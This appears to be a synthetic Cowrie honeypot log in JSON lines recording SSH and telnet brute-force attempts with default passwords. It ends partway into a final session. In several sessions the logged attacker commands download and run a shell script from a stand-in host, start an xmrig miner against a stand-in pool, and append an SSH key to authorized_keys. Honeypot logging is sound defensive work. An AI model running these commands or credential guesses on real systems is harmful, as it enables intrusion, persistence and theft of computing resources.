+{"timestamp": "2026-11-06T02:53:27.000000Z", "src_ip": "198.51.100.45", "session": "2d8a4cdf", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-06T02:54:51.000000Z", "src_ip": "198.51.100.45", "session": "2d8a4cdf", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 3.2}
+{"timestamp": "2026-11-06T03:38:00.000000Z", "src_ip": "203.0.113.130", "session": "82376e64", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 52170, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-06T03:38:00.000000Z", "src_ip": "203.0.113.130", "session": "82376e64", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-06T03:38:00.000000Z", "src_ip": "203.0.113.130", "session": "82376e64", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-06T03:38:05.000000Z", "src_ip": "203.0.113.130", "session": "82376e64", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "raspberry"}
+{"timestamp": "2026-11-06T03:38:06.000000Z", "src_ip": "203.0.113.130", "session": "82376e64", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "postgres", "password": "12345678"}
+{"timestamp": "2026-11-06T03:38:24.000000Z", "src_ip": "203.0.113.130", "session": "82376e64", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-06T03:38:33.000000Z", "src_ip": "203.0.113.130", "session": "82376e64", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-06T03:38:33.000000Z", "src_ip": "203.0.113.130", "session": "82376e64", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-06T03:39:09.000000Z", "src_ip": "203.0.113.130", "session": "82376e64", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 115.7}
+{"timestamp": "2026-11-06T05:36:00.000000Z", "src_ip": "198.51.100.23", "session": "d488b0a4", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 47835, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-06T05:36:00.000000Z", "src_ip": "198.51.100.23", "session": "d488b0a4", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-06T05:36:00.000000Z", "src_ip": "198.51.100.23", "session": "d488b0a4", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-06T05:36:01.000000Z", "src_ip": "198.51.100.23", "session": "d488b0a4", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "qwerty"}
+{"timestamp": "2026-11-06T05:36:02.000000Z", "src_ip": "198.51.100.23", "session": "d488b0a4", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "user", "password": "root"}
+{"timestamp": "2026-11-06T05:36:22.000000Z", "src_ip": "198.51.100.23", "session": "d488b0a4", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-06T05:36:54.000000Z", "src_ip": "198.51.100.23", "session": "d488b0a4", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 56.2}
+{"timestamp": "2026-11-06T05:38:00.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 55880, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-06T05:38:00.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-06T05:38:00.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-06T05:38:01.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "user", "password": "qwerty"}
+{"timestamp": "2026-11-06T05:38:10.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-06T05:38:11.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-06T05:38:20.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-06T05:38:20.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-06T05:38:34.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-06T05:39:09.000000Z", "src_ip": "198.51.100.59", "session": "364bb23e", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 29.3}
+{"timestamp": "2026-11-06T06:50:00.000000Z", "src_ip": "198.51.100.31", "session": "aec9fc6c", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 32956, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-06T06:50:00.000000Z", "src_ip": "198.51.100.31", "session": "aec9fc6c", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-06T06:50:00.000000Z", "src_ip": "198.51.100.31", "session": "aec9fc6c", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-06T06:50:03.000000Z", "src_ip": "198.51.100.31", "session": "aec9fc6c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-06T06:50:04.000000Z", "src_ip": "198.51.100.31", "session": "aec9fc6c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "admin"}
+{"timestamp": "2026-11-06T06:50:06.000000Z", "src_ip": "198.51.100.31", "session": "aec9fc6c", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-06T06:50:07.000000Z", "src_ip": "198.51.100.31", "session": "aec9fc6c", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "qwerty"}
+{"timestamp": "2026-11-06T06:50:23.000000Z", "src_ip": "198.51.100.31", "session": "aec9fc6c", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cat /proc/cpuinfo | grep name | wc -l"}
+{"timestamp": "2026-11-06T06:50:45.000000Z", "src_ip": "198.51.100.31", "session": "aec9fc6c", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 64.0}
+{"timestamp": "2026-11-06T07:17:00.000000Z", "src_ip": "198.51.100.16", "session": "d51be06f", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 35397, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-06T07:17:04.000000Z", "src_ip": "198.51.100.16", "session": "d51be06f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "12345678"}
+{"timestamp": "2026-11-06T07:17:09.000000Z", "src_ip": "198.51.100.16", "session": "d51be06f", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "postgres", "password": "password"}
+{"timestamp": "2026-11-06T07:17:28.000000Z", "src_ip": "198.51.100.16", "session": "d51be06f", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "cd /tmp; wget http://dl.botnet-sample.invalid/x86.sh; chmod +x x86.sh; ./x86.sh"}
+{"timestamp": "2026-11-06T07:17:28.000000Z", "src_ip": "198.51.100.16", "session": "d51be06f", "sensor": "ssh-in", "eventid": "cowrie.session.file_download", "url": "http://dl.botnet-sample.invalid/x86.sh", "shasum": "5f1c3f0a0b9d6e2c4a8b7e6d5c4b3a291817161514131211100f0e0d0c0b0a09", "outfile": "var/lib/cowrie/downloads/x"}
+{"timestamp": "2026-11-06T07:17:43.000000Z", "src_ip": "198.51.100.16", "session": "d51be06f", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-06T07:18:01.000000Z", "src_ip": "198.51.100.16", "session": "d51be06f", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-06T07:18:36.000000Z", "src_ip": "198.51.100.16", "session": "d51be06f", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 105.6}
+{"timestamp": "2026-11-06T10:08:00.000000Z", "src_ip": "203.0.113.125", "session": "9219c11f", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 34655, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-06T10:08:00.000000Z", "src_ip": "203.0.113.125", "session": "9219c11f", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-06T10:08:00.000000Z", "src_ip": "203.0.113.125", "session": "9219c11f", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-06T10:08:05.000000Z", "src_ip": "203.0.113.125", "session": "9219c11f", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "qwerty"}
+{"timestamp": "2026-11-06T10:08:07.000000Z", "src_ip": "203.0.113.125", "session": "9219c11f", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "ubuntu", "password": "raspberry"}
+{"timestamp": "2026-11-06T10:08:20.000000Z", "src_ip": "203.0.113.125", "session": "9219c11f", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "echo 'ssh-rsa AAAAB3NzaC1 sample@key' >> ~/.ssh/authorized_keys"}
+{"timestamp": "2026-11-06T10:09:11.000000Z", "src_ip": "203.0.113.125", "session": "9219c11f", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 100.2}
+{"timestamp": "2026-11-06T16:01:00.000000Z", "src_ip": "198.51.100.15", "session": "7e4b9284", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 52661, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-06T16:01:00.000000Z", "src_ip": "198.51.100.15", "session": "7e4b9284", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-06T16:01:00.000000Z", "src_ip": "198.51.100.15", "session": "7e4b9284", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-06T16:01:05.000000Z", "src_ip": "198.51.100.15", "session": "7e4b9284", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "user", "password": "raspberry"}
+{"timestamp": "2026-11-06T16:01:10.000000Z", "src_ip": "198.51.100.15", "session": "7e4b9284", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-06T16:01:19.000000Z", "src_ip": "198.51.100.15", "session": "7e4b9284", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 113.9}
+{"timestamp": "2026-11-06T16:02:00.000000Z", "src_ip": "198.51.100.31", "session": "3886b6fe", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 56277, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-06T16:02:00.000000Z", "src_ip": "198.51.100.31", "session": "3886b6fe", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-06T16:02:00.000000Z", "src_ip": "198.51.100.31", "session": "3886b6fe", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-06T16:02:02.000000Z", "src_ip": "198.51.100.31", "session": "3886b6fe", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "password"}
+{"timestamp": "2026-11-06T16:02:04.000000Z", "src_ip": "198.51.100.31", "session": "3886b6fe", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "123456"}
+{"timestamp": "2026-11-06T16:02:07.000000Z", "src_ip": "198.51.100.31", "session": "3886b6fe", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "git", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-06T16:02:12.000000Z", "src_ip": "198.51.100.31", "session": "3886b6fe", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-06T16:02:22.000000Z", "src_ip": "198.51.100.31", "session": "3886b6fe", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 20.9}
+{"timestamp": "2026-11-06T20:57:00.000000Z", "src_ip": "198.51.100.19", "session": "043b520a", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 55474, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-06T20:57:00.000000Z", "src_ip": "198.51.100.19", "session": "043b520a", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-06T20:57:00.000000Z", "src_ip": "198.51.100.19", "session": "043b520a", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-06T20:57:02.000000Z", "src_ip": "198.51.100.19", "session": "043b520a", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "12345678"}
+{"timestamp": "2026-11-06T20:57:03.000000Z", "src_ip": "198.51.100.19", "session": "043b520a", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "support", "password": "123456"}
+{"timestamp": "2026-11-06T20:57:21.000000Z", "src_ip": "198.51.100.19", "session": "043b520a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-06T20:57:30.000000Z", "src_ip": "198.51.100.19", "session": "043b520a", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "uname -a"}
+{"timestamp": "2026-11-06T20:58:46.000000Z", "src_ip": "198.51.100.19", "session": "043b520a", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 43.9}
+{"timestamp": "2026-11-06T21:40:00.000000Z", "src_ip": "198.51.100.13", "session": "b09679de", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 51226, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-06T21:40:00.000000Z", "src_ip": "198.51.100.13", "session": "b09679de", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-06T21:40:00.000000Z", "src_ip": "198.51.100.13", "session": "b09679de", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-06T21:40:01.000000Z", "src_ip": "198.51.100.13", "session": "b09679de", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-06T21:40:03.000000Z", "src_ip": "198.51.100.13", "session": "b09679de", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "raspberry"}
+{"timestamp": "2026-11-06T21:40:05.000000Z", "src_ip": "198.51.100.13", "session": "b09679de", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-06T21:40:08.000000Z", "src_ip": "198.51.100.13", "session": "b09679de", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "password"}
+{"timestamp": "2026-11-06T21:40:10.000000Z", "src_ip": "198.51.100.13", "session": "b09679de", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-06T21:41:37.000000Z", "src_ip": "198.51.100.13", "session": "b09679de", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 89.4}
+{"timestamp": "2026-11-07T03:20:00.000000Z", "src_ip": "203.0.113.105", "session": "41d04e29", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 36619, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-07T03:20:00.000000Z", "src_ip": "203.0.113.105", "session": "41d04e29", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-Go"}
+{"timestamp": "2026-11-07T03:20:00.000000Z", "src_ip": "203.0.113.105", "session": "41d04e29", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-07T03:20:05.000000Z", "src_ip": "203.0.113.105", "session": "41d04e29", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "raspberry"}
+{"timestamp": "2026-11-07T03:20:10.000000Z", "src_ip": "203.0.113.105", "session": "41d04e29", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "qwerty"}
+{"timestamp": "2026-11-07T03:20:13.000000Z", "src_ip": "203.0.113.105", "session": "41d04e29", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "pi", "password": "raspberry"}
+{"timestamp": "2026-11-07T03:20:18.000000Z", "src_ip": "203.0.113.105", "session": "41d04e29", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "qwerty"}
+{"timestamp": "2026-11-07T03:20:37.000000Z", "src_ip": "203.0.113.105", "session": "41d04e29", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "crontab -l"}
+{"timestamp": "2026-11-07T03:22:27.000000Z", "src_ip": "203.0.113.105", "session": "41d04e29", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 40.2}
+{"timestamp": "2026-11-07T03:34:00.000000Z", "src_ip": "198.51.100.11", "session": "25df1fb7", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 46407, "dst_ip": "192.0.2.20", "dst_port": 23, "protocol": "telnet"}
+{"timestamp": "2026-11-07T03:34:05.000000Z", "src_ip": "198.51.100.11", "session": "25df1fb7", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "raspberry"}
+{"timestamp": "2026-11-07T03:34:06.000000Z", "src_ip": "198.51.100.11", "session": "25df1fb7", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "root"}
+{"timestamp": "2026-11-07T03:36:04.000000Z", "src_ip": "198.51.100.11", "session": "25df1fb7", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 28.4}
+{"timestamp": "2026-11-07T10:02:00.000000Z", "src_ip": "198.51.100.12", "session": "a7729aa0", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 31835, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-07T10:02:00.000000Z", "src_ip": "198.51.100.12", "session": "a7729aa0", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-libssh_0.9.6"}
+{"timestamp": "2026-11-07T10:02:00.000000Z", "src_ip": "198.51.100.12", "session": "a7729aa0", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-07T10:02:01.000000Z", "src_ip": "198.51.100.12", "session": "a7729aa0", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "admin"}
+{"timestamp": "2026-11-07T10:02:06.000000Z", "src_ip": "198.51.100.12", "session": "a7729aa0", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "qwerty"}
+{"timestamp": "2026-11-07T10:02:10.000000Z", "src_ip": "198.51.100.12", "session": "a7729aa0", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "ubuntu"}
+{"timestamp": "2026-11-07T10:04:05.000000Z", "src_ip": "198.51.100.12", "session": "a7729aa0", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 67.5}
+{"timestamp": "2026-11-07T10:07:00.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 57000, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-07T10:07:00.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-07T10:07:00.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "0a07365cc01fa9fc82608ba4019af499"}
+{"timestamp": "2026-11-07T10:07:04.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "ubuntu"}
+{"timestamp": "2026-11-07T10:07:08.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "admin"}
+{"timestamp": "2026-11-07T10:07:09.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "qwerty"}
+{"timestamp": "2026-11-07T10:07:14.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "admin"}
+{"timestamp": "2026-11-07T10:07:17.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "postgres", "password": "12345678"}
+{"timestamp": "2026-11-07T10:07:30.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "curl -s ipinfo.io"}
+{"timestamp": "2026-11-07T10:07:47.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "ls -la /"}
+{"timestamp": "2026-11-07T10:08:01.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "nohup ./xmrig -o stratum+tcp://pool.miner-sample.invalid:3333 --donate-level 1 &"}
+{"timestamp": "2026-11-07T10:08:03.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-07T10:08:47.000000Z", "src_ip": "198.51.100.37", "session": "744b8963", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 37.9}
+{"timestamp": "2026-11-07T10:58:00.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 32786, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-07T10:58:00.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-07T10:58:00.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-07T10:58:04.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "admin"}
+{"timestamp": "2026-11-07T10:58:09.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "password"}
+{"timestamp": "2026-11-07T10:58:10.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "oracle", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-07T10:58:15.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "support", "password": "1qaz2wsx"}
+{"timestamp": "2026-11-07T10:58:19.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "12345678"}
+{"timestamp": "2026-11-07T10:58:24.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "root", "password": "root"}
+{"timestamp": "2026-11-07T10:58:28.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "admin", "password": "admin"}
+{"timestamp": "2026-11-07T10:58:31.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-07T10:59:22.000000Z", "src_ip": "198.51.100.54", "session": "3206c63b", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 64.5}
+{"timestamp": "2026-11-07T13:00:00.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 54283, "dst_ip": "192.0.2.20", "dst_port": 22, "protocol": "ssh"}
+{"timestamp": "2026-11-07T13:00:00.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
+{"timestamp": "2026-11-07T13:00:00.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.client.kex", "hassh": "ec7378c1a92f5a8dde7e8b7a1ddf33d1"}
+{"timestamp": "2026-11-07T13:00:01.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "ubuntu"}
+{"timestamp": "2026-11-07T13:00:05.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "postgres", "password": "12345678"}
+{"timestamp": "2026-11-07T13:00:10.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "test", "password": "admin"}
+{"timestamp": "2026-11-07T13:00:15.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "git", "password": "password"}
+{"timestamp": "2026-11-07T13:00:18.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.login.failed", "username": "ubuntu", "password": "root"}
+{"timestamp": "2026-11-07T13:00:19.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.login.success", "username": "root", "password": "P@ssw0rd"}
+{"timestamp": "2026-11-07T13:00:36.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.command.input", "input": "pkill -9 xmrig"}
+{"timestamp": "2026-11-07T13:01:07.000000Z", "src_ip": "203.0.113.127", "session": "54b1e39d", "sensor": "ssh-in", "eventid": "cowrie.session.closed", "duration": 67.5}
+{"timestamp": "2026-11-07T14:30:00.000000Z", "src_ip": "198.51.100.48", "session": "5a7e4dbc", "sensor": "ssh-in", "eventid": "cowrie.session.connect", "src_port": 41697, "dst_ip": "192.0.2.20", "dst_port": 2222, "protocol": "ssh"}
+{"timestamp": "2026-11-07T14:30:00.000000Z", "src_ip": "198.51.100.48", "session": "5a7e4dbc", "sensor": "ssh-in", "eventid": "cowrie.client.version", "version": "SSH-2.0-OpenSSH_8.9p1"}
